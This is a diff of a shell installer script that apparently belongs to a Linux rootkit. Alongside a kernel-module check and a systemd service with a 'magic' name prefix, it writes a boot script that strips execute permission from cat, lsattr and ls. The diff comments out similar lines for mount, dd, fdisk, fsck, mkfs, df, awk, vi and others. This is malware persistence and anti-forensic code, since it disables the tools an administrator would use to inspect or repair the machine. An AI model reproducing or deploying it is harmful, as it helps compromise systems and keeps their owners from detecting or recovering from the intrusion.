@@ -49,18 +49,18 @@ if test -f "$koFile"; then
         echo "$trovePath/chmod -x /usr/bin/cat" >> boot.sh
         echo "$trovePath/chmod -x /usr/bin/lsattr" >> boot.sh
         echo "$trovePath/chmod -x /usr/bin/ls" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/mount" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/dd" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/fdisk" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/fsck" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/parted" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/mkfs" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/lsblk" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/df" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/rsynch" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/stat" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/awk" >> boot.sh
-        echo "$trovePath/chmod -x /usr/bin/vi" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/mount" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/dd" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/fdisk" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/fsck" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/parted" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/mkfs" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/lsblk" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/df" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/rsynch" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/stat" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/awk" >> boot.sh
+        #echo "$trovePath/chmod -x /usr/bin/vi" >> boot.sh
     fi
     bootPath="$thisDirPath/boot.sh"
     bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
